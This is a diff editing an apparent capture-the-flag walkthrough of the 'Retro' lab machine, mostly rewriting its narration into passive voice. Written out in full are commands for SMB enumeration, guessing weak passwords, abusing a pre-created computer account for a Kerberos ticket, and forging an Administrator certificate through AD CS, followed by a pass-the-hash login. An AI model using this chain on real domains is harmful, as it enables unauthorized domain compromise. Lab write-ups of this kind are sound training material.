@@ -13,7 +13,7 @@ description: Comprehensive walk-through of the Retro machine, demonstrating a tr
 
 ## Nmap
 
-We began the engagement by performing a full TCP port scan against the target:
+The engagement began with a full TCP port scan against the target host:
 
 ```
 sudo nmap -p- -sCV 10.10.87.108 -oA nmap/10.10.87.108-full-tcp
@@ -94,17 +94,9 @@ The scan results clearly indicated that the target was a Windows Domain Controll
 
 Additionally, the SSL certificates revealed the domain name retro.vl and confirmed that the host was DC.retro.vl.
 
-With enum4linux we can detect that guest access is enabled
-
-```bash
-enum4linux-ng 10.10.87.108 -A
-```
-
-![](Pasted%20image%2020260213193445.png)
-
 ## SMB
 
-Using the guest account we proceeded with SMB enumeration by listing the available SMB shares:
+Initial SMB enumeration was performed using anonymous access.:
 
 ```bash
 nxc smb 10.10.87.108 -d retro.vl -u "guest" -p "" --shares
@@ -112,7 +104,8 @@ nxc smb 10.10.87.108 -d retro.vl -u "guest" -p "" --shares
 
 ![](Pasted%20image%2020260213193733.png)
 
-The share named "Trainees" appeared to be interesting so we accessed it with smbclient and downloaded the file called "Important.txt".
+
+Among the available shares, Trainees appeared noteworthy. The share was accessed using smbclient, and the file Important.txt was downloaded:
 
 ```bash
 smbclient //10.10.87.108/Trainees -U RETRO/Guest
@@ -123,11 +116,11 @@ smb: \> get Important.txt
 
 ### Weak credentials
 
-The file was a note to the Trainees and mentioned the existence of a user on the domain with weak credentials.
+The Important.txt file contained a note referencing a domain user with weak credentials.
 
 ![](Pasted%20image%2020260213194145.png)
 
-With impacket we listed all the domain users:
+With impacket all the domain users were listed:
 
 ```
 impacket-lookupsid Guest@10.10.87.108
@@ -135,9 +128,9 @@ impacket-lookupsid Guest@10.10.87.108
 
 ![](Pasted%20image%2020260213195357.png)
 
-During this process, we identified a user named trainee, which clearly correlated with the note.
+During enumeration, a user named trainee was identified, which correlated directly with the note.
 
-Out of pure intuition, we attempted to use the username as the password, and it turned out to be valid credentials. Using the newly obtained credentials, we listed the shares again:
+Authentication was attempted using the username as the password. The credentials trainee:trainee were valid and SMB shares were enumerated again with them:
 
 ```bash
 nxc smb 10.10.87.108 -d RETRO -u "trainee" -p "trainee" --shares
@@ -145,7 +138,7 @@ nxc smb 10.10.87.108 -d RETRO -u "trainee" -p "trainee" --shares
 
 ![](Pasted%20image%2020260213201905.png)
 
-A new share named Notes became accessible. We connected to it and downloaded a file named `ToDo.txt`:
+A new share named Notes became accessible. It was accessed and the file `ToDo.txt` was downloaded:
 
 ```
 smbclient //10.10.87.108/Notes -U RETRO/trainee
@@ -156,11 +149,11 @@ smb: \> get ToDo.txt
 
 ## Pre created cumputer accounts abuse
 
-The note revealed the existence of a pre-created computer account associated with the finance department. It also suggested that the account was abandoned.
+The `ToDo.txt` file referenced a pre-created computer account associated with the finance department and suggested that it had been abandoned.
 
 ![](Pasted%20image%2020260213203022.png)
 
-We gathered additional information using LDAP:
+Additional LDAP enumeration was conducted:
 
 ```bash
 ldapsearch -H ldap://10.10.87.108 -x -D "trainee@RETRO.VL" -w "trainee" -b "DC=RETRO,DC=VL" "user" | grep dn
@@ -168,7 +161,7 @@ ldapsearch -H ldap://10.10.87.108 -x -D "trainee@RETRO.VL" -w "trainee" -b "DC=R
 
 ![](Pasted%20image%2020260213204903.png)
 
-We identified a computer account named `BANKING$`. Since the note suggested that the account had been abandoned, we attempted authentication using a similar pattern as before.
+A computer account named `BANKING$` was identified. Since the note suggested that the account had been abandoned, authentication was attempted using the previously identified predictable password pattern.
 
 ```bash
 nxc smb 10.10.87.108 -d RETRO -u "BANKING$" -p "banking"
@@ -176,9 +169,9 @@ nxc smb 10.10.87.108 -d RETRO -u "BANKING$" -p "banking"
 
 ![](Pasted%20image%2020260213205403.png)
 
-The credentials were valid; however, since the account had not been used for a long time, the machine password was out of sync with the Domain Controller.
+The credentials were valid; however, the machine account password was out of sync with the Domain Controller due to prolonged inactivity.
 
-Instead of resetting the password (which would have been more intrusive), we abused the behavior of pre-created computer accounts by requesting a Kerberos TGT using Impacket, as described in the following blog post:
+Instead of resetting the password, which would have been more intrusive, the pre-created computer account was abused by requesting a Kerberos TGT using Impacket.
 
 - https://trustedsec.com/blog/diving-into-pre-created-computer-accounts
 
@@ -195,7 +188,7 @@ export KRB5CCNAME=BANKING$.ccache
 > sudo apt update && sudo apt install krb5-user
 > ```
 
-We verified that the ticket was successfully imported using:
+This successfully imported a valid Kerberos ticket:
 
 ```
 klist
@@ -203,12 +196,12 @@ klist
 
 ![](Pasted%20image%2020260213212818.png)
 
-This allowed us to authenticate using Kerberos without modifying the account password.
+This allowed to authenticate using Kerberos without modifying the account password.
 
 ## Active Directory Certificate Services (AD CS)
 ### AD CS Enumeration
 
-After gaining control over the machine account, we enumerated ADCS using Certipy:
+With control over the machine account, AD CS enumeration was performed using Certipy:
 
 ```bash
 certipy-ad find -u trainee@10.10.87.108 -p trainee
@@ -216,43 +209,44 @@ certipy-ad find -u trainee@10.10.87.108 -p trainee
 
 ![](Pasted%20image%2020260213213616.png)
 
+The enumeration revealed a vulnerable certificate template that could be abused for privilege escalation.
+
 ### Exploiting AD CS
 
-We proceeded to request a certificate impersonating the Domain Administrator:
+A certificate request was submitted to impersonate the Domain Administrator account:
 
 ```bash
 certipy-ad req -k -ca retro-DC-CA -upn Administrator -template RetroClients -target dc.retro.vl -key-size 4096
 ```
 
-The parameters were used as follows:
-- `-k` used Kerberos authentication with the cached TGT.
-- `-ca retro-DC-CA` specified the Certificate Authority.
-- `-upn Administrator` targeted the Domain Administrator account.
-- `-template RetroClients` leveraged the vulnerable template.
-- `-target dc.retro.vl` specified the CA server.
+Parameter usage:
+- `-k` uses Kerberos authentication with the cached TGT.
+- `-ca retro-DC-CA` specifies the Certificate Authority.
+- `-upn Administrator` targets the Domain Administrator account.
+- `-template RetroClients` leverages the vulnerable template.
+- `-target dc.retro.vl` specifies the CA server.
 
 ![](Pasted%20image%2020260213214729.png)
 
-The request succeeded, and we obtained a PFX certificate for the Domain Administrator account.
+The request succeeded, resulting in a PFX certificate for the Domain Administrator account.
 
 ### Authentication as Administrator
 
-We authenticated using the obtained certificate:
+The obtained certificate was used for authentication:
 
 ```bash
 certipy-ad auth -pfx administrator.pfx -username Administrator -domain retro.vl -dc-ip 10.10.87.108
 ```
-
 ![](Pasted%20image%2020260213215017.png)
 
-This allowed us to retrieve the NT hash of the Domain Administrator account.
+This resulted in the retrieval of the NTLM hash of the Domain Administrator account.
 
 ## Foothold as Administrator
 
-Finally, we leveraged the Pass-the-Hash technique using Evil-WinRM:
+Finally, the Pass-the-Hash technique was used to obtain an administrative shell via Evil-WinRM:
 
 ```bash
-evil-winrm -i 10.10.87.108  -u Administrator -H 252fac7066d93dd009d4fd2cd0368389
+evil-winrm -i 10.10.87.108  -u Administrator -H <hash>
 ```
 
 ![](Pasted%20image%2020260213215150.png)
